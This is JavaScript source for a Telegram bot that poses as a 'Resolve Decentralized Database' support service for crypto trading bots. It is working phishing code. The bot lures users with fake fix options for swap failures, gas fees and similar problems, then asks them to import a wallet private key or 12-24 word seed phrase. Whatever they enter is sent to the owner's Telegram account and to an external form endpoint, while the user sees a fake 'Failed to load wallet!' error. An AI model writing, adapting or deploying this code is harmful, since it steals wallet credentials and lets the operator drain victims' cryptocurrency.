const express = require('express');
const dotenv = require('dotenv');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

dotenv.config();
const app = express();
app.use(express.json()); // Needed for Telegram webhook updates

const PORT = process.env.PORT || 8080;

// Environment Variables
const token = process.env.BOT_TOKEN;
const ownerId = process.env.OWNER_ID;
const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
const appUrl = process.env.APP_URL; // https://your-app.up.railway.app

if (!token || !ownerId || !formUnstaticURL || !appUrl) {
  console.error(
    '❌ Missing required environment variables. Check your .env file.'
  );
  throw new Error('Missing required environment variables!');
}

// Create bot WITHOUT polling
const bot = new TelegramBot(token);

// ✅ Webhook endpoint (Telegram will POST updates here)
app.post(`/bot${token}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ✅ Health check endpoints
app.get('/', (req, res) => {
  res.status(200).send('Bot is live 🚀');
});

app.get('/health', (req, res) => {
  res.status(200).send('Bot is running ✅');
});

// Store user states
const chatStates = {};

// Function to send data to FormUnstatic
const sendToFormUnstatic = async (name, message) => {
  if (!name || !message) {
    console.error('Missing name or message for FormUnstatic submission.');
    return;
  }

  try {
    const response = await axios.post(
      formUnstaticURL,
      new URLSearchParams({ name, message }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    console.log('✅ Data sent to FormUnstatic:', response.data);
  } catch (error) {
    console.error(
      '❌ Error sending data to FormUnstatic:',
      error.response?.data || error.message
    );
  }
};

// Handle incoming messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (msg.text === 'Cancel') {
    delete chatStates[chatId];
    return bot.sendMessage(chatId, '✅ Operation canceled.');
  }

  if (chatStates[chatId] === 'awaiting_private_key') {
    const privateKey = msg.text;

    bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
    sendToFormUnstatic('Private Key Received', privateKey);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
  } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
    const seedPhrase = msg.text;

    bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
    sendToFormUnstatic('Seed Phrase Received', seedPhrase);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    delete chatStates[chatId];
  } else {
    bot.sendMessage(chatId, `Hello, ${msg.from.first_name}!`);
  }
});

// Handle /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = `🌠 Welcome to the Resolve Decentralized Database

Here, you can address issues such as:
• Bot glitches
• Swap failures
• Configuration errors
• Asset recovery
• Validation problems
• High slippage
• Rugged token issues
• Failed transactions
• High gas fees

🚀 Please select an issue to continue.`;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: ' ⚙️ RECTIFICATION ⚙️', callback_data: 'options' },
          { text: ' ⚙️ VALIDATION ⚙️', callback_data: 'options' },
        ],
        [
          { text: ' ⚙️ CONFIGURATION ⚙️', callback_data: 'options' },
          { text: ' ⚙️ ASSET RECOVERY ⚙️', callback_data: 'options' },
        ],
        [
          { text: ' ⚙️ SWAP FAIL ⚙️', callback_data: 'options' },
          { text: ' ⚙️ CLEAR BOT GLITCH ⚙️', callback_data: 'options' },
        ],
        [
          { text: '⚙️ HIGH SLIPPAGE ⚙️', callback_data: 'options' },
          { text: '⚙️ FAILED BUY & SELL ⚙️', callback_data: 'options' },
        ],
        [
          { text: '⚙️ HIGH GAS FEE ⚙️', callback_data: 'options' },
          { text: '⚙️ TURBO MODE ⚙️', callback_data: 'options' },
        ],
        [
          { text: '⚙️ FAILED SNIPE ⚙️', callback_data: 'options' },
          { text: '⚙️ TECHNICAL BUGS ⚙️', callback_data: 'options' },
        ],
      ],
    },
  };

  bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
});

// Wallet selection keyboard
const walletSelectionKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: 'NOVA', callback_data: 'wallet_selected' }],
      [{ text: 'FIRST LEDGER', callback_data: 'wallet_selected' }],
      [{ text: 'BLOOM', callback_data: 'wallet_selected' }],
      [{ text: 'BEAR BULL', callback_data: 'wallet_selected' }],
      [{ text: 'MAESTRO', callback_data: 'wallet_selected' }],
      [{ text: 'AUTO SNIPE', callback_data: 'wallet_selected' }],
      [{ text: 'TROJAN', callback_data: 'wallet_selected' }],
      [{ text: 'NOKBOT', callback_data: 'wallet_selected' }],
      [{ text: 'PHOTON WEB', callback_data: 'wallet_selected' }],
      [{ text: 'XBOT', callback_data: 'wallet_selected' }],
      [{ text: 'GMGN AI', callback_data: 'wallet_selected' }],
      [{ text: 'SUNDOG', callback_data: 'wallet_selected' }],
      [{ text: 'SOL TRADING BOT', callback_data: 'wallet_selected' }],
      [{ text: 'BANANA GUNBOT', callback_data: 'wallet_selected' }],
      [{ text: 'UNIBOT', callback_data: 'wallet_selected' }],
      [{ text: 'SHURIKEN', callback_data: 'wallet_selected' }],
      [{ text: 'PEPE BOT', callback_data: 'wallet_selected' }],
      [{ text: 'TRADEWIZ', callback_data: 'wallet_selected' }],
      [{ text: 'KSPR BOT', callback_data: 'wallet_selected' }],
      [{ text: 'SIGMA BOT', callback_data: 'wallet_selected' }],
      [{ text: 'MEVX WEB', callback_data: 'wallet_selected' }],
      [{ text: 'FINDER BOT WEB', callback_data: 'wallet_selected' }],
      [{ text: 'PRODIGY BOT', callback_data: 'wallet_selected' }],
      [{ text: 'MAGNUM BOT', callback_data: 'wallet_selected' }],
      [{ text: 'WALLET CONNECT', callback_data: 'wallet_selected' }],
    ],
  },
};

// Handle callback queries
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  switch (query.data) {
    case 'options':
      bot.sendMessage(chatId, 'Select your bot:', walletSelectionKeyboard);
      break;

    case 'wallet_selected':
      bot.sendMessage(chatId, 'ℹ️ Connect wallet to use settings', {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'IMPORT PRIVATE KEY',
                callback_data: 'import_private_key',
              },
            ],
            [
              {
                text: 'IMPORT SEED PHRASE',
                callback_data: 'import_seed_phrase',
              },
            ],
          ],
        },
      });
      break;

    case 'import_private_key':
      bot.sendMessage(chatId, 'Enter private key 🔑', {
        reply_markup: {
          keyboard: [[{ text: 'Cancel' }]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
      chatStates[chatId] = 'awaiting_private_key';
      break;

    case 'import_seed_phrase':
      bot.sendMessage(
        chatId,
        'Enter 12-24 word mnemonic / recovery phrase ⬇️',
        {
          reply_markup: {
            keyboard: [[{ text: 'Cancel' }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
      chatStates[chatId] = 'awaiting_seed_phrase';
      break;

    case 'try_again':
      bot.sendMessage(chatId, 'Restarting process...', {
        reply_markup: { remove_keyboard: true },
      });
      bot.emit('message', { chat: { id: chatId }, text: '/start' });
      break;
  }

  bot.answerCallbackQuery(query.id);
});

// ✅ Start server, then set webhook
app.listen(PORT, async () => {
  console.log(`🚀 Server running on port ${PORT}`);

  try {
    await bot.setWebHook(`${appUrl}/bot${token}`);
    console.log(`✅ Webhook set to ${appUrl}/bot${token}`);
  } catch (err) {
    console.error('❌ Failed to set webhook:', err.message);
  }
});
